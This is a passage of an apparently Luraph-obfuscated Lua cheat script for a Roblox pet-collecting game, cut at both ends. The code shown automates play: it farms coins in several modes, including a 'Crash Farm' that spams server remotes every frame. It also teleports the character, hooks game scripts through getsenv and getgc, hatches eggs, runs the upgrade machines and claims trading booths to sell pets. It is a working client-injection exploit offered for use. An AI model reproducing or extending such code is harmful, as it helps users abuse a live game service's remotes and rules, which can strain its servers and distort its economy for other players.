                        Index = Index + 1
                        ActiveTypes[v.Name].Amount.Text = tostring(Library.Functions.Commas(Different).."" in 60s"")
                        ActiveTypes[v.Name].Amount_odometerGUIFX.Text = tostring(Library.Functions.Commas(Different).."" in 60s"")
                    end
                end
                task.wait()
                Now = tick()
                PastTime = PastTime + (Now - Last)
                Last = Now
            end
        end)
    end
end

--// Farming Functions
local function CollectOrbs()
    Workspace[""__THINGS""].Orbs.ChildAdded:connect(function(Orb)
        if Config.Farming.CollectOrbs or Config.Valentines.StartHeartFarm or Config.Farming.StartCompleteGame then
            pcall(function() getsenv(Scripts.Game.Orbs).Collect(Orb) task.wait(0.02) Orb:Destroy() end) 
        end
    end)
end
CollectOrbs()

local function CollectLootbags()
    Workspace[""__THINGS""].Lootbags.ChildAdded:connect(function(Lootbag)
        if Config.Farming.CollectOrbs or Config.Valentines.StartHeartFarm or Config.Farming.StartCompleteGame then
            pcall(function() getsenv(Scripts.Game.Lootbags).Collect(Lootbag) end)
        end
    end)
end
CollectLootbags()

local function LoadCoins()
    local CoinsList = {}
    LPH_JIT_MAX(function()
        local Coins = UseRemote(Remotes[""Get Coins""])
        for i,v in pairs(Coins) do
            task.spawn(function()
                if (Config.Farming.Mode == ""Normal"") or (Config.Farming.Mode == ""Single Target"") or (Config.Farming.Mode == ""Heartbeat Farm"") or (Config.Farming.Mode == ""Crash Farm"") then
                    if table.find(Config.Farming.Areas, v.a) and not table.find(Config.Farming.Blacklisted, v.n) then
                        if Config.Farming.Mode == ""Farm Aura"" then
                            table.insert(CoinsList, {[""Position""] = v.p, [""CoinID""] = i, [""Area""] = v.a})
                        elseif Config.Farming.CoinType == ""Farm Closest Area"" then
                            local NearestDistance = math.huge
                            local NearestArea
                            for i2,v2 in pairs(game:GetService(""Workspace"")[""__MAP""].Teleports:GetChildren()) do
                                if (GetHumanoidRootPart().CFrame.p - v2.CFrame.p).Magnitude < NearestDistance then
                                    NearestDistance = (GetHumanoidRootPart().CFrame.p - v2.CFrame.p).Magnitude
                                    NearestArea = v2.Name
                                end
                            end
                            if string.find(v.a, NearestArea) then
                                table.insert(CoinsList, {[""Position""] = v.p, [""CoinID""] = i, [""Area""] = v.a})
                            end
                        else
                            table.insert(CoinsList, {[""Position""] = v.p, [""CoinID""] = i, [""Area""] = v.a})
                        end
                    end
                end
            end)
        end
        if Config.Farming.Mode == ""Single Target"" or Config.Farming.Mode == ""Heartbeat Farm"" then
            table.sort(CoinsList, function(a,b)
                return a.CoinID < b.CoinID
            end)
        end
        if Config.Farming.CoinType == ""Highest Coin Multiplier"" then
            table.sort(CoinsList, function(a,b)
                local MultiplierANumber = 0
                local MultiplierBNumber = 0
                if Coins[a.CoinID].b then
                    MultiplierANumber = Coins[a.CoinID].b.l[1].m
                end
                if Coins[b.CoinID].b then
                    MultiplierBNumber = Coins[b.CoinID].b.l[1].m
                end
                return MultiplierANumber > MultiplierBNumber
            end)
        elseif Config.Farming.CoinType == ""Highest Health"" then
            table.sort(CoinsList, function(a,b)
                return Coins[a.CoinID].h > Coins[b.CoinID].h
            end)
        elseif Config.Farming.CoinType == ""Lowest Health"" then
            table.sort(CoinsList, function(a,b)
                return Coins[a.CoinID].h < Coins[b.CoinID].h
            end)
        elseif Config.Farming.CoinType == ""Diamonds"" then
            table.sort(CoinsList, function(a,b)
                local DiamondsANumber = 0
                local DiamondsBNumber = 0
                if Coins[a.CoinID].n:find(""Diamonds"") then
                    DiamondsANumber = 3
                end
                if Coins[b.CoinID].n:find(""Diamonds"") then
                    DiamondsBNumber = 3
                end
                return DiamondsANumber > DiamondsBNumber
            end)
        elseif Config.Farming.CoinType == ""Lucky Blocks"" then
            table.sort(CoinsList, function(a,b)
                local LuckyBlockANumber = 0
                local LuckyBlockBNumber = 0
                if Coins[a.CoinID].n:find(""Lucky Block"") then
                    LuckyBlockANumber = 3
                end
                if Coins[b.CoinID].n:find(""Lucky Block"") then
                    LuckyBlockBNumber = 3
                end
                return LuckyBlockANumber > LuckyBlockBNumber
            end)
        elseif Config.Farming.CoinType == ""Hearts"" then
            table.sort(CoinsList, function(a,b)
                local HeartANumber = 0
                local HeartBNumber = 0
                if Coins[a.CoinID].n:find(""Heart"") then
                    HeartANumber = 3
                end
                if Coins[b.CoinID].n:find(""Heart"") then
                    HeartBNumber = 3
                end
                return HeartANumber > HeartBNumber
            end)
        end
        if Config.Farming.Mode == ""Farm Aura"" then
            table.sort(CoinsList, function(a,b)
                return (GetHumanoidRootPart().CFrame.p - a.Position).Magnitude < (GetHumanoidRootPart().CFrame.p - b.Position).Magnitude
            end)
        end
    end)()
    return CoinsList
end

local function LoadPets()
    local EquippedPets = {}
    if IsHardcoreMode then
        for i,v in pairs(Library.Save.Get().HardcorePetsEquipped) do
            table.insert(EquippedPets, i)
        end
    else
        for i,v in pairs(Library.Save.Get().PetsEquipped) do
            table.insert(EquippedPets, i)
        end
    end
    return EquippedPets
end

local function CoinFarm()
    pcall(function()
        local PetData = LoadPets()
        local CoinData = LoadCoins()
        if Config.Farming.Mode == ""Normal"" then
            if Config.Farming.SendAllPets then
                for i,v in pairs(CoinData) do
                    if not Config.Farming.StartFarm then return end
                    task.spawn(function()
                        if Config.Farming.TeleportToCoinsArea then
                            if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[v.Area].CFrame.p).Magnitude > 15 then
                                GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[v.Area].CFrame + Vector3.new(0,4,0)
                            end
                        end
                        UseRemote(Remotes[""Join Coin""], v.CoinID, PetData)
                    end)
                    for i2,v2 in pairs(PetData) do
                        if not Config.Farming.StartFarm then return end
                        UseRemote(Remotes[""Farm Coin""], v.CoinID, v2)
                        if Config.Farming.PetSendSpeed ~= 0 then
                            task.wait(Config.Farming.PetSendSpeed / 1000)
                        end
                    end
                    task.wait(Config.Farming.FarmSpeed)
                end
            elseif Config.Farming.SendAllPets == false then
                for i = 1,3 do
                    for i = 1, #PetData do
                        if not Config.Farming.StartFarm then break end
                        task.spawn(function()
                            local CoinToFarm = math.random(1, #CoinData)
                            if Config.Farming.TeleportToCoinsArea then
                                if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[CoinToFarm].Area].CFrame.p).Magnitude > 15 then
                                    GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[CoinToFarm].Area].CFrame + Vector3.new(0,4,0)
                                end
                            end
                            UseRemote(Remotes[""Join Coin""], CoinData[CoinToFarm].CoinID, {PetData[i]})
                            UseRemote(Remotes[""Farm Coin""], CoinData[CoinToFarm].CoinID, PetData[i])
                        end)
                    end
                end
            end
        elseif Config.Farming.Mode == ""Single Target"" then
            if Config.Farming.SendAllPets then
                if Config.Farming.TeleportToCoinsArea then
                    if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[1].Area].CFrame.p).Magnitude > 15 then
                        GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[1].Area].CFrame + Vector3.new(0,4,0)
                    end
                end
                UseRemote(Remotes[""Join Coin""], CoinData[1].CoinID, PetData)
                for i2,v2 in pairs(PetData) do
                    UseRemote(Remotes[""Farm Coin""], CoinData[1].CoinID, v2)
                        if Config.Farming.PetSendSpeed ~= 0 then
                        task.wait(Config.Farming.PetSendSpeed / 1000)
                    end
                end
                task.wait(Config.Farming.FarmSpeed)
            elseif Config.Farming.SendAllPets == false then
                for i = 1, #PetData do
                    if not Config.Farming.StartFarm then break end
                    task.spawn(function()
                        if Config.Farming.TeleportToCoinsArea then
                            if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[i].Area].CFrame.p).Magnitude > 15 then
                                GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[i].Area].CFrame + Vector3.new(0,4,0)
                            end
                        end
                        UseRemote(Remotes[""Join Coin""], CoinData[i].CoinID, {PetData[i]})
                        UseRemote(Remotes[""Farm Coin""], CoinData[i].CoinID, PetData[i]) 
                    end)
                    task.wait(Config.Farming.FarmSpeed)
                end
            end
        elseif Config.Farming.Mode == ""Farm Aura"" then
            if Config.Farming.SendAllPets then
                if Config.Farming.TeleportToCoinsArea then
                    if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[1].Area].CFrame.p).Magnitude > 15 then
                        GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[1].Area].CFrame + Vector3.new(0,4,0)
                    end
                end
                UseRemote(Remotes[""Join Coin""], CoinData[1].CoinID, PetData)
                for i2,v2 in pairs(PetData) do
                    UseRemote(Remotes[""Farm Coin""], CoinData[1].CoinID, v2)
                    if Config.Farming.PetSendSpeed ~= 0 then
                        task.wait(Config.Farming.PetSendSpeed / 1000)
                    end
                end
                task.wait(Config.Farming.FarmSpeed)
            elseif Config.Farming.SendAllPets == false then
                for i = 1, #PetData do
                    if not Config.Farming.StartFarm then break end
                    task.spawn(function()
                        if Config.Farming.TeleportToCoinsArea then
                            if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[v.Area].CFrame.p).Magnitude > 15 then
                                GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[v.Area].CFrame + Vector3.new(0,4,0)
                            end
                        end
                        UseRemote(Remotes[""Join Coin""], CoinData[i].CoinID, {PetData[i]})
                        UseRemote(Remotes[""Farm Coin""], CoinData[i].CoinID, PetData[i])
                    end)
                    task.wait(Config.Farming.FarmSpeed)
                end
            end
        elseif Config.Farming.Mode == ""Heartbeat Farm"" then
            if Config.Farming.SendAllPets then
                task.spawn(function()
                    if Config.Farming.TeleportToCoinsArea then
                        if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[1].Area].CFrame.p).Magnitude > 15 then
                            GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[1].Area].CFrame + Vector3.new(0,4,0)
                        end
                    end
                    UseRemote(Remotes[""Join Coin""], CoinData[1].CoinID, PetData)
                    for i2,v2 in pairs(PetData) do
                        task.spawn(function()
                            UseRemote(Remotes[""Farm Coin""], CoinData[1].CoinID, v2)
                            if Config.Farming.PetSendSpeed ~= 0 then
                                task.wait(Config.Farming.PetSendSpeed / 1000)
                            end
                        end)
                    end
                    UseRemote(Remotes[""Leave Coin""], CoinData[1].CoinID, PetData)
                end)
            elseif Config.Farming.SendAllPets == false then
                for i = 1, #PetData do
                    if not Config.Farming.StartFarm then break end
                    task.spawn(function()
                        if Config.Farming.TeleportToCoinsArea then
                            if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[i].Area].CFrame.p).Magnitude > 15 then
                                GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[CoinData[i].Area].CFrame + Vector3.new(0,4,0)
                            end
                        end
                        UseRemote(Remotes[""Join Coin""], CoinData[i].CoinID, {PetData[i]})
                        UseRemote(Remotes[""Farm Coin""], CoinData[i].CoinID, PetData[i])
                    end)
                end
                task.wait(0.3)
                for i = 1, #PetData do
                    if not Config.Farming.StartFarm then break end
                    task.spawn(function()
                        UseRemote(Remotes[""Leave Coin""], CoinData[i].CoinID, {PetData[i]})
                    end)
                end
                task.wait(Config.Farming.FarmSpeed)
            end
        elseif Config.Farming.Mode == ""Crash Farm"" then
            RunService.RenderStepped:Connect(function()
                task.spawn(function()
                    for i,v in pairs(CoinData) do
                        if not Config.Farming.StartFarm then return end
                        task.spawn(function()
                            if Config.Farming.TeleportToCoinsArea then
                                if (GetHumanoidRootPart().CFrame.p - game:GetService(""Workspace"")[""__MAP""].Teleports[v.Area].CFrame.p).Magnitude > 15 then
                                    GetHumanoidRootPart().CFrame = game:GetService(""Workspace"")[""__MAP""].Teleports[v.Area].CFrame + Vector3.new(0,4,0)
                                end
                            end
                            UseRemote(Remotes[""Join Coin""], v.CoinID, PetData)
                            if Config.Farming.PetSendSpeed ~= 0 then
                                task.wait(Config.Farming.PetSendSpeed / 1000)
                            end
                        end)
                        for i2,v2 in pairs(PetData) do
                            task.spawn(function()
                                if not Config.Farming.StartFarm then return end
                                UseRemote(Remotes[""Farm Coin""], v.CoinID, v2)
                            end)
                        end
                    end
                end)
            end)
        end
    end)
end

--//Valentines
local WorldIndex = 1
local CurrentWorld = ""None""
local LuckyBlocksLeft = ""0""
local WaitingForCoins = ""0s Left""
local HasBeenToFirstWorld = false
function HeartFarm()
    LPH_NO_VIRTUALIZE(function()
        pcall(function()
            local ChoosenWorlds = {}
            for i,v in pairs(Config.Valentines.Worlds) do
                if v == true then
                    table.insert(ChoosenWorlds, i)
                end
            end
            local PetData = LoadPets()
            local Coins = UseRemote(Remotes[""Get Coins""])
            function RetrieveBlocks()
                local HeartList = {}
                for i,v in pairs(Coins) do
                    task.spawn(function()
                        if string.find(v.n, ""Heart"") then
                            if v.a  ~= ""VIP"" then
                                if Library.WorldCmds.HasArea(v.a) then
                                    table.insert(HeartList, {[""CoinID""] = i, [""CoinWorld""] = v.w, [""CoinArea""] = v.a})
                                end
                            end
                        end
                    end)
                end
                return HeartList
            end
            function WaitForCoins()
                local TimeToWait = os.time() + 15
                repeat task.wait()
                    WaitingForCoins = tostring(TimeToWait - os.time())..""s Left""
                until os.time() == TimeToWait
            end
            function TeleportToWorld()
                if Config.Valentines.StartWorldTeleport then
                    if ChoosenWorlds[WorldIndex] then
                        if ChoosenWorlds[WorldIndex] == ""Spawn"" then
                            Library.WorldCmds.Load(""Spawn"")
                            getsenv(Scripts.GUIs.Teleport).Teleport(""Shop"")
                            WaitForCoins()
                        elseif ChoosenWorlds[WorldIndex] == ""Axolotl"" then
                            Library.WorldCmds.Load(""Axolotl Ocean"")
                            WaitForCoins()
                        else
                            Library.WorldCmds.Load(ChoosenWorlds[WorldIndex])
                            WaitForCoins()
                        end
                    else
                        if Config.Valentines.StartServerTeleport then
                            LowServerTeleport(false)
                        end
                    end
                else
                    if ChoosenWorlds[WorldIndex] then
                        UseRemote(Remotes[""Request World""], ChoosenWorlds[WorldIndex])
                        WaitForCoins()
                    else
                        if Config.Valentines.StartServerTeleport then
                            LowServerTeleport(false)
                        end
                    end
                end
            end
            if #RetrieveBlocks() == 0 then
            if HasBeenToFirstWorld then 
                    WorldIndex = WorldIndex + 1
                    if not Config.Valentines.StartServerTeleport then
                        if not ChoosenWorlds[WorldIndex] then
                            WorldIndex = 1
                        end
                    end
                    TeleportToWorld()
                else
                    CurrentWorld = ChoosenWorlds[WorldIndex]
                    TeleportToWorld()
                    HasBeenToFirstWorld = true
                end
            end
            for i,v in pairs(RetrieveBlocks()) do
                if not Config.Valentines.StartHeartFarm then break end
                task.spawn(function()
                    GetHumanoidRootPart().CFrame = Workspace.__MAP.Boxes:FindFirstChild(v.CoinArea).CFrame + Vector3.new(0,10,0)
                    task.wait(0.1)
                    UseRemote(Remotes[""Join Coin""], v.CoinID, PetData)
                end)
                for i2,v2 in pairs(PetData) do
                    UseRemote(Remotes[""Farm Coin""], v.CoinID, v2)
                end
                LuckyBlocksLeft = #RetrieveBlocks()
                CurrentWorld = v.CoinWorld
            end
        end)
    end)()
end

--// Egg Functions
local EggsHatched = ""No Egg Selected""
local EggsRemaining = ""No Egg Selected""
local function BuyEgg()
    local TripleHatch = false
    local OctupleHatch = false
    local CurrencyPath = (IsHardcoreMode and Library.Save.Get().HardcoreCurrency) or Library.Save.Get()
    if Config.Pets.Mode == ""Single"" then
        TripleHatch = false
        OctupleHatch = false
    elseif Config.Pets.Mode == ""Triple"" then
        TripleHatch = true
        OctupleHatch = false
    elseif Config.Pets.Mode == ""Octuple"" then
        TripleHatch = false
        OctupleHatch = true
    end
    for i,v in pairs(Library.Save.Get().EggsOpened) do
        if i == Config.Pets.ChoosenEgg then
            EggsHatched = Library.Functions.Commas(tonumber(v))
        end
    end
    for i,v in pairs(Library.Directory.Eggs) do
        if i == Config.Pets.ChoosenEgg then
            for i2,v2 in pairs(CurrencyPath) do
                if i2 == v.currency then
                    EggsRemaining = Library.Functions.Commas(math.floor(v2 / v.cost) % 1000000000)
                end
            end
        end
    end
    if Config.Pets.TeleportToEgg then
        for i,v in pairs(game:GetService(""Workspace"")[""__MAP""].Eggs:GetDescendants()) do
            if v.Name == ""Egg Capsule"" then
                if v:GetAttribute(""ID"") == Config.Pets.ChoosenEgg then
                    if (GetHumanoidRootPart().CFrame.p - v.Egg.CFrame.p).Magnitude > 15 then
                        GetHumanoidRootPart().CFrame = v.Egg.CFrame
                    end
                end
            end
        end
    end
    UseRemote(Remotes[""Buy Egg""], Config.Pets.ChoosenEgg, TripleHatch, OctupleHatch)
end

local function MasteryBuyEgg(EggName)
    local TripleHatch = false
    local OctupleHatch = false
    if Config.Pets.Mode == ""Single"" then
        TripleHatch = false
        OctupleHatch = false
    elseif Config.Pets.Mode == ""Triple"" then
        TripleHatch = true
        OctupleHatch = false
    elseif Config.Pets.Mode == ""Octuple"" then
        TripleHatch = false
        OctupleHatch = true
    end
    UseRemote(Remotes[""Buy Egg""], EggName, TripleHatch, OctupleHatch)
end

--// Machines
local function MakePetsGolden()
    local PetsToInsert = {
        [""Regular""] = {},
        [""Hardcore""] = {},
        [""Shiny""] = {},
        [""ShinyHardcore""] = {}
    }
    for i,v in pairs(Library.Save.Get().Pets) do
        if Library.Directory.Pets[v.id].rarity ~= ""Exclusive"" and not HasPetEquipped(v.uid) and not v.hce and not v.l and not v.g and not v.r and not v.dm and v.id ~= ""6969"" then
            if (Config.Machines.Golden.GoldenHC and v.hc) then
                if (Config.Machines.Golden.GoldenShiny and v.sh) then
                    if not PetsToInsert.ShinyHardcore[v.id] then
                        PetsToInsert.ShinyHardcore[v.id] = {}
                    end
                    if not PetsToInsert.ShinyHardcore[v.id][v.uid] then
                        PetsToInsert.ShinyHardcore[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
                if not v.sh then
                    if not PetsToInsert.Hardcore[v.id] then
                        PetsToInsert.Hardcore[v.id] = {}
                    end
                    if not PetsToInsert.Hardcore[v.id][v.uid] then
                        PetsToInsert.Hardcore[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh, [""ID""] = Library.Directory.Pets[v.id].name}
                    end
                end
            end
            if not v.hc then
                if (Config.Machines.Golden.GoldenShiny and v.sh) then
                    if not PetsToInsert.Shiny[v.id] then
                        PetsToInsert.Shiny[v.id] = {}
                    end
                    if not PetsToInsert.Shiny[v.id][v.uid] then
                        PetsToInsert.Shiny[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
                if not v.sh then
                    if not PetsToInsert.Regular[v.id] then
                        PetsToInsert.Regular[v.id] = {}
                    end
                    if not PetsToInsert.Regular[v.id][v.uid] then
                        PetsToInsert.Regular[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
            end
        end
    end
    local PetsToGold = {}
    local PetAmount
    for i,v in pairs(PetsToInsert) do
        for i2,v2 in pairs(v) do
            for i3,v3 in pairs(v2) do
                if v3.Hardcore == true then
                    PetAmount = Config.Machines.Golden.GoldenHCAmount
                else
                    PetAmount = Config.Machines.Golden.GoldenAmount
                end
                if CalculateItemsInTable(v2, 1) >= PetAmount then
                    if #PetsToGold < PetAmount then
                        table.insert(PetsToGold, i3)
                    else
                        break
                    end
                else
                    break
                end
            end
            if #PetsToGold >= PetAmount then
                UseRemote(Remotes[""Use Golden Machine""], PetsToGold)
            end
        end
    end
end

local function MakePetsRainbow()
    local PetsToInsert = {
        [""Regular""] = {},
        [""Hardcore""] = {},
        [""Shiny""] = {},
        [""ShinyHardcore""] = {}
    }
    for i,v in pairs(Library.Save.Get().Pets) do
        if Library.Directory.Pets[v.id].rarity ~= ""Exclusive"" and not HasPetEquipped(v.uid) and not v.hce and not v.l and v.g and v.id ~= ""6969"" then
            if (Config.Machines.Rainbow.RainbowHC and v.hc) then
                if (Config.Machines.Rainbow.RainbowShiny and v.sh) then
                    if not PetsToInsert.ShinyHardcore[v.id] then
                        PetsToInsert.ShinyHardcore[v.id] = {}
                    end
                    if not PetsToInsert.ShinyHardcore[v.id][v.uid] then
                        PetsToInsert.ShinyHardcore[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
                if not v.sh then
                    if not PetsToInsert.Hardcore[v.id] then
                        PetsToInsert.Hardcore[v.id] = {}
                    end
                    if not PetsToInsert.Hardcore[v.id][v.uid] then
                        PetsToInsert.Hardcore[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh, [""ID""] = Library.Directory.Pets[v.id].name}
                    end
                end
            end
            if not v.hc then
                if (Config.Machines.Rainbow.RainbowShiny and v.sh) then
                    if not PetsToInsert.Shiny[v.id] then
                        PetsToInsert.Shiny[v.id] = {}
                    end
                    if not PetsToInsert.Shiny[v.id][v.uid] then
                        PetsToInsert.Shiny[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
                if not v.sh then
                    if not PetsToInsert.Regular[v.id] then
                        PetsToInsert.Regular[v.id] = {}
                    end
                    if not PetsToInsert.Regular[v.id][v.uid] then
                        PetsToInsert.Regular[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
            end
        end
    end
    local PetsToRainbow = {}
    local PetAmount
    for i,v in pairs(PetsToInsert) do
        for i2,v2 in pairs(v) do
            for i3,v3 in pairs(v2) do
                if v3.Hardcore == true then
                    PetAmount = Config.Machines.Rainbow.RainbowHCAmount
                else
                    PetAmount = Config.Machines.Rainbow.RainbowAmount
                end
                if CalculateItemsInTable(v2, 1) >= PetAmount then
                    if #PetsToRainbow < PetAmount then
                        table.insert(PetsToRainbow, i3)
                    else
                        break
                    end
                else
                    break
                end
            end
            if #PetsToRainbow >= PetAmount then
                UseRemote(Remotes[""Use Rainbow Machine""], PetsToRainbow)
            end
        end
    end
end

local function MakePetsDarkMatter()
    local PetsToInsert = {
        [""Regular""] = {},
        [""Hardcore""] = {},
        [""Shiny""] = {},
        [""ShinyHardcore""] = {}
    }
    for i,v in pairs(Library.Save.Get().Pets) do
        if Library.Directory.Pets[v.id].rarity ~= ""Exclusive"" and not HasPetEquipped(v.uid) and not v.hce and not v.l and v.r and v.id ~= ""6969"" then
            if (Config.Machines.DarkMatter.DarkMatterHC and v.hc) then
                if (Config.Machines.DarkMatter.DarkMatterShiny and v.sh) then
                    if not PetsToInsert.ShinyHardcore[v.id] then
                        PetsToInsert.ShinyHardcore[v.id] = {}
                    end
                    if not PetsToInsert.ShinyHardcore[v.id][v.uid] then
                        PetsToInsert.ShinyHardcore[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
                if not v.sh then
                    if not PetsToInsert.Hardcore[v.id] then
                        PetsToInsert.Hardcore[v.id] = {}
                    end
                    if not PetsToInsert.Hardcore[v.id][v.uid] then
                        PetsToInsert.Hardcore[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh, [""ID""] = Library.Directory.Pets[v.id].name}
                    end
                end
            end
            if not v.hc then
                if (Config.Machines.DarkMatter.DarkMatterShiny and v.sh) then
                    if not PetsToInsert.Shiny[v.id] then
                        PetsToInsert.Shiny[v.id] = {}
                    end
                    if not PetsToInsert.Shiny[v.id][v.uid] then
                        PetsToInsert.Shiny[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
                if not v.sh then
                    if not PetsToInsert.Regular[v.id] then
                        PetsToInsert.Regular[v.id] = {}
                    end
                    if not PetsToInsert.Regular[v.id][v.uid] then
                        PetsToInsert.Regular[v.id][v.uid] = {[""Hardcore""] = v.hc, [""Shiny""] = v.sh}
                    end
                end
            end
        end
    end
    local PetsToDarkMatter = {}
    local PetAmount
    for i,v in pairs(PetsToInsert) do
        for i2,v2 in pairs(v) do
            for i3,v3 in pairs(v2) do
                if v3.Hardcore == true then
                    PetAmount = Config.Machines.DarkMatter.DarkMatterHCAmount
                else
                    PetAmount = Config.Machines.DarkMatter.DarkMatterAmount
                end
                if CalculateItemsInTable(v2, 1) >= PetAmount then
                    if #PetsToDarkMatter < PetAmount then
                        table.insert(PetsToDarkMatter, i3)
                    else
                        break
                    end
                else
                    break
                end
            end
            if #PetsToDarkMatter >= PetAmount then
                UseRemote(Remotes[""Convert To Dark Matter""], PetsToDarkMatter)
            end
        end
    end
end

local function ClaimDarkMatterPets()
    for i,v in pairs(Library.Save.Get(game.Players.LocalPlayer).DarkMatterQueue) do
        if os.time() >= v.readyTime then
            UseRemote(Remotes[""Redeem Dark Matter Pet""], i)
        else
            break
        end
    end
end

local PetsToInsert1 = {}
local IdIndex1 = 1
local function FusePets()
    if Config.Machines.Fusing.Mode == ""Normal"" then
        local PetsToFuse1 = {}
        local IdsToFuse1 = {}
        for i,v in pairs(Library.Save.Get().Pets) do
            if (Library.Directory.Pets[v.id].rarity ~= ""Exclusive"") and (Library.Directory.Pets[v.id].rarity ~= ""Mythical"") and (not HasPetEquipped(v.uid)) and (not v.hce) and (not v.l) and v.id ~= ""6969"" then
                if not table.find(IdsToFuse1, v.id) then
                    table.insert(IdsToFuse1, v.id)
                end
            end
        end
        for i,v in pairs(Library.Save.Get().Pets) do
            if (Library.Directory.Pets[v.id].rarity ~= ""Exclusive"") and (Library.Directory.Pets[v.id].rarity ~= ""Mythical"") and (not HasPetEquipped(v.uid)) and (not v.hce) and (not v.l) and v.id ~= ""6969"" then
                if v.id == IdsToFuse1[IdIndex1] then
                    if not table.find(PetsToInsert1, v.uid) then
                        table.insert(PetsToInsert1, v.uid)
                    end
                end
            end
        end
        if #PetsToInsert1 >= Config.Machines.Fusing.Amount then
            for i,v in pairs(PetsToInsert1) do
                if #PetsToFuse1 < Config.Machines.Fusing.Amount then
                    table.insert(PetsToFuse1, v)
                    table.remove(PetsToInsert1, i)
                else
                    break
                end
            end
        end
        if #PetsToFuse1 >= Config.Machines.Fusing.Amount then
            UseRemote(Remotes[""Fuse Pets""], PetsToFuse1)
        end
        if not IdsToFuse1[IdIndex1] then
            IdIndex1 = 1
        else
            IdIndex1 = IdIndex1 + 1
        end
    elseif Config.Machines.Fusing.Mode == ""Lowest Strength"" then
        local PetsToInsert2 = {}
        local PetsToFuse2 = {}
        for i,v in pairs(Library.Save.Get().Pets) do
            if (Library.Directory.Pets[v.id].rarity ~= ""Exclusive"") and (Library.Directory.Pets[v.id].rarity ~= ""Mythical"") and (not HasPetEquipped(v.uid)) and (not v.hce) and (not v.l) and v.id ~= ""6969"" then
                table.insert(PetsToInsert2, v)
            end
        end
        if #PetsToInsert2 >= tonumber(Config.Machines.Fusing.WhenToStop) then
            table.sort(PetsToInsert2, function(a,b)
                return a.s < b.s
            end)
            for i,v in pairs(PetsToInsert2) do
                if #PetsToFuse2 < Config.Machines.Fusing.Amount then
                    table.insert(PetsToFuse2, v.uid)
                else
                    break
                end
            end
        end
        UseRemote(Remotes[""Fuse Pets""], PetsToFuse2)
    end
end

--// Booths
local function ClaimBooth()
    if not getsenv(Player.PlayerScripts.Scripts.Game[""Trading Booths""]).GetBooth() then
        local UnclaimedBooths = {}
        for i,v in pairs(getgc(true)) do
            if type(v) == ""table"" and rawget(v, ""Model"") and rawget(v, ""ID"") then
                if v.ID ~= 0 and v.Model and v.Model:FindFirstChild(""Booth"") then
                    table.insert(UnclaimedBooths, {[""Booth""] = v.Model.Booth, [""ID""] = v.ID})
                end
            end
        end
        table.sort(UnclaimedBooths, function(a,b)
            return (GetHumanoidRootPart().Position - a.Booth.Position).Magnitude < (GetHumanoidRootPart().Position - b.Booth.Position).Magnitude
        end)
        if Config.Booths.Extra.WalkToBooth then
            FindPath(UnclaimedBooths[1].Booth)
        end
        if not Config.Booths.Selling.StartSellingPet then return end
        UseRemote(Remotes[""Claim Trading Booth""], UnclaimedBooths[1].ID)
        return true
    else
        return true
    end
end

local function SellPets()
    LPH_NO_VIRTUALIZE(function()
        pcall(function()
            ClaimBooth()
            for i,v in pairs(Config.Booths.Selling.SellingList) do
                task.spawn(function()
                    local PetsToSell = {}
                    local Settings = {
                        [""Regular""] = (table.find(v.Type, ""Regular"") and true) or false,
                        [""Hardcore""] = (table.find(v.Type, ""Hardcore"") and true) or false,
                        [""Shiny""] = (table.find(v.Type, ""Shiny"") and true) or false,
                        [""Golden""] = (table.find(v.Type, ""Golden"") and true) or false,
                        [""Rainbow""] = (table.find(v.Type, ""Rainbow"") and true) or false,
                        [""Dark Matter""] = (table.find(v.Type, ""Dark Matter"") and true) or false,
                        [""Any""] = (table.find(v.Type, ""Any"") and true) or false,
                    }
                    local function CheckPets(PetTable)
                        if (Settings[""Regular""] and (not PetTable.hc and not PetTable.sh and ((Settings[""Golden""] and Settings[""Regular""]) and (not PetTable.hc and not PetTable.sh and PetTable.g)) or ((Settings[""Rainbow""] and Settings[""Regular""]) and (not PetTable.hc and not PetTable.sh and PetTable.r)) or ((Settings[""Dark Matter""] and Settings[""Regular""]) and (not PetTable.hc and not PetTable.sh and PetTable.dm)))) then
                            return true
                        end
                        if ((Settings[""Regular""] and not Settings[""Hardcore""] and not Settings[""Shiny""] and not Settings[""Golden""] and not Settings[""Rainbow""] and not Settings[""Dark Matter""]) and (not PetTable.hc and not PetTable.sh and not PetTable.g and not PetTable.r and not PetTable.dm)) then
                            return true
                        end
